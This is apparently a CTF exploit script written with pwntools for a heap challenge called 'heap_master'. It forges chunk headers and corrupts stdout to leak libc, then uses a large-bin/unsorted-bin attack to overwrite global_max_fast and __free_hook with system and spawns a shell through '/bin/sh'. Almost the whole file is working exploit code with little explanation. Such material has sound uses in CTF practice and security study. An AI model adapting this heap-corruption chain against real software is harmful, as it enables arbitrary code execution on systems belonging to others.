#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1

libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK):
        log.failure("Invalid path {} to ld".format(ld))
        return None


    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK):
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)


    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\x00'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK):
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path))
    return ELF(path)

if debug == 1:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    stdout_addr = 0x2620
    elf = ELF('./heap_master')
    p = process('./heap_master')

elif debug == 2:
    libc = ELF('./libc.so.6')
    stdout_addr = 0x5600
    elf = change_ld("./heap_master",'./ld-linux-x86-64.so.2')
    p = elf.process(env={"LD_PRELOAD":"./libc.so.6"})

def Add(size):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))

def Edit(offset,content):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil("offset: ")
    p.sendline(str(offset))

    p.recvuntil("size: ")
    p.sendline(str(len(content)))

    p.recvuntil("content: ")
    p.send(content)

def Delete(offset):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil("offset: ")
    p.sendline(str(offset))

def Exit():
    p.recvuntil('>> ')
    p.sendline('4')

def exp():
    offset = 0x8800-0x7a0
    #leak libc
    Edit(offset+0,p64(0)+p64(0x331))#0
    Edit(offset+0x330,p64(0)+p64(0x31))#1
    Edit(offset+0x330+0x30,p64(0)+p64(0x411))#2
    Edit(offset+0x330+0x30+0x410,p64(0)+p64(0x31))#3
    Edit(offset+0x330+0x30+0x410+0x30,p64(0)+p64(0x411))#4
    Edit(offset+0x330+0x30+0x410+0x30+0x410,p64(0)+p64(0x31))#5
    Edit(offset+0x330+0x30+0x410+0x30+0x410+0x30,p64(0)+p64(0x31))#6

    Delete(offset+0x10)#0
    Delete(offset+0x330+0x30+0x10)#2
    Add(0x90)

    #set two main_arena addr
    Edit(offset+0x330+0x30,p64(0)+p64(0x111)+p64(0)+p64(0x101))
    Edit(offset+0x330+0x30+0x110,p64(0)+p64(0x101))
    Edit(offset+0x330+0x30+0x110+0x100,p64(0)+p64(0x101))


    Delete(offset+0x330+0x30+0x10+0x10)
    Add(0x90)
    Edit(offset+0x330+0x30+0x110,p64(0)+p64(0x101))

    Delete(offset+0x330+0x30+0x10)
    Add(0x90)

    #recover
    #Edit(0x330+0x30,p64(0)+p64(0x411))#2 again

    Edit(offset+0x330+0x30+0x3f0,p64(0x3f0)+p64(0x20)+p64(0)*2+p64(0)+p64(0x31))

    #
    Edit(offset+0x330+0x30+0x8,p64(0x3f1)+p64(0)+p16(stdout_addr-0x10))
    Edit(offset+0x330+0x30+0x18+0x8,p64(0)+p16(stdout_addr+0x19-0x20))
    Delete(offset+0x330+0x30+0x410+0x30+0x10)#4


    Add(0x90)
    if debug == 1:
        p.recvn(0x18)
        libc_base = u64(p.recv(8)) - (0x7ffff7dd06e0 - 0x7ffff7a0d000)
        #map
        map_addr = u64(p.recv(8)) - (0xc13b1800-0xc13a9000)
    else:
        map_addr = u64(p.recv(8))
        libc_base = u64(p.recv(8)) - (0x7ffff7dd5683-0x7ffff7a37000)

    log.success("libc base => " + hex(libc_base))
    log.success("map addr => " + hex(map_addr))
    #get shell
    #large bin attack change free_hook to map_addr
    #also can be implemented by just free
    offset = 0
    Edit(offset+0,p64(0)+p64(0x331))#0
    Edit(offset+0x330,p64(0)+p64(0x31))#1
    Edit(offset+0x330+0x30,p64(0)+p64(0x511))#2
    Edit(offset+0x330+0x30+0x510,p64(0)+p64(0x31))#3
    Edit(offset+0x330+0x30+0x510+0x30,p64(0)+p64(0x511))#4
    Edit(offset+0x330+0x30+0x510+0x30+0x510,p64(0)+p64(0x31))#5
    Edit(offset+0x330+0x30+0x510+0x30+0x510+0x30,p64(0)+p64(0x31))#6
    libc.address =  libc_base
    io_list_all = libc.sym['__free_hook']

    Delete(offset+0x10)#0
    Delete(offset+0x330+0x30+0x10)#2
    Add(0x90)

    Delete(offset+0x330+0x30+0x510+0x30+0x10)#4

    Edit(offset+0x330+0x30,p64(0)+p64(0x3f1)+p64(0)+p64(io_list_all-0x10)+p64(0)+p64(io_list_all-0x20))
    Edit(offset+0x330+0x30+0x3f0,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
    io_heap_addr = map_addr + offset + 0x8a0

    Add(0x90)
    #ub to change global max fast
    Edit(0x82e0+0x18,p64(libc_base+(0x7ffff7dd37f8-0x7ffff7a0d000)-0x10))
    Add(0xa0)
    #

    #calc size
    main_arena = libc.sym['__malloc_hook']+0x10
    idx = (libc.sym['__free_hook']-(main_arena+8))/8
    size = idx*0x10 + 0x20

    Edit(0x8a0,p64(0)+p64(size+1)+p64(libc.sym['system']))
    Edit(0x8a0+size,p64(0)+p64(0x21)+"/bin/sh\x00")
    Edit(0x8a0+size+0x20,p64(0)+p64(0x21))
    gdb.attach(p)

    Add(size-0x10)
    Delete(0x8a0+size+0x10)


    p.interactive()

exp()
